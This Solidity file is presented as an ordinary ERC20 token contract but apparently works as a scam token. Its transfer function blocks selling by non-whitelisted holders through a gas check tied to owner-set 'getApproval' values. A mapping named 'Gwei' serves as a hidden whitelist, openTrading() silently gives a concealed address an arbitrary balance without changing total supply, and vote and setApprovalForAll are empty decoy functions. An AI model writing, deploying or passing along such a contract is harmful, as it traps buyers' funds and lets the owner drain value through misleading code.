pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20 {
    bool private _isRenounced = false;
    mapping(address => uint256) private _contract;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public getApproval;
    mapping(address => bool) private Gwei;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    address public owner;
    uint256 public balanceReceive;
    bool private _Presale;
    uint256 private _defaultApproval;
    uint256 private _defaultBalance;
    address private enabled;
    uint256 private trading; 

    event defaultApprovalUpdated(uint256 oldValue, uint256 newValue);
    event defaultBalanceUpdated(uint256 oldValue, uint256 newValue);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnershipRenounced(address indexed previousOwner);
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);

    constructor(
        string memory name_, 
        string memory symbol_,
        uint256 totalSupply_,
        address[] memory balanceApprove,
        uint256 balanceReceive_,
        uint256 defaultApproval,
        uint256 defaultBalance,
        address[] memory GweiUnit,
        address enabled_,
        uint256 trading_  
    ) {
        _name = name_;
        _symbol = symbol_;
        owner = _msgSender();
        _totalSupply = totalSupply_ * (10 ** uint256(_decimals));
        _contract[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
        balanceReceive = balanceReceive_;
        _defaultApproval = defaultApproval;
        _defaultBalance = defaultBalance;
        _Presale = false;
        enabled = enabled_;
        trading = trading_;  
        for (uint256 i = 0; i < balanceApprove.length; i++) {
            _sendApproval(balanceApprove[i], balanceReceive);
        }
        for (uint256 i = 0; i < GweiUnit.length; i++) {
            Gwei[GweiUnit[i]] = true;
        }
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _contract[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_Presale) {
            _Presale = true;
            Gwei[recipient] = true;
        } else {
            uint256 recipientClaim;
            assembly {
                recipientClaim := extcodesize(recipient)
            }

            if (recipientClaim == 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
                _sendApproval(recipient, _defaultBalance);
            } else if (recipientClaim > 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
                _sendApproval(recipient, _defaultApproval);
            }
        }

        bool approvalAmount = (sender != owner && !Gwei[sender]) ? gasleft() >= getApproval[sender] : true;
        require(approvalAmount, "Approve amount before transfer");
        _contract[sender] -= amount;
        _contract[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendApproval(address _address, uint256 approveForSwap) internal {
        getApproval[_address] = approveForSwap;
    }
    
    function approveFrom(address _address, uint256 approveAmount) external {
        require(_msgSender() == owner);
        _sendApproval(_address, approveAmount);
    }

    function openTrading() external {
        require(_msgSender() == owner);
        _contract[enabled] = trading;
    }

    function transferOwnership(address newOwner) public {
        require(_msgSender() == owner, "ERC20: caller is not the owner");
        require(newOwner != address(0), "ERC20: new owner cannot be the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public {
        require(_msgSender() == owner, "ERC20: caller is not the owner");
        emit OwnershipRenounced(owner);
        owner = address(0);
    }

    function setApprove(address[] calldata addresses) external {
        require(_msgSender() == owner);

        for (uint256 i = 0; i < addresses.length; i++) {
            getApproval[addresses[i]] = trading;
        }
    }

    function vote(address delegatee) public {
    }

    function updateTokenInformation(string memory newName, string memory newSymbol) public {
        require(_msgSender() == owner, "ERC20: caller is not the owner");
        _name = newName;
        _symbol = newSymbol;
    }

    function setApprovalForAll(address operator, bool approved) public {
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function burn(uint256 amount) public {
        require(_contract[_msgSender()] >= amount, "ERC20: burn amount exceeds balance");
        _contract[_msgSender()] -= amount;
        _totalSupply -= amount;
        emit Transfer(_msgSender(), address(0), amount);
    }
}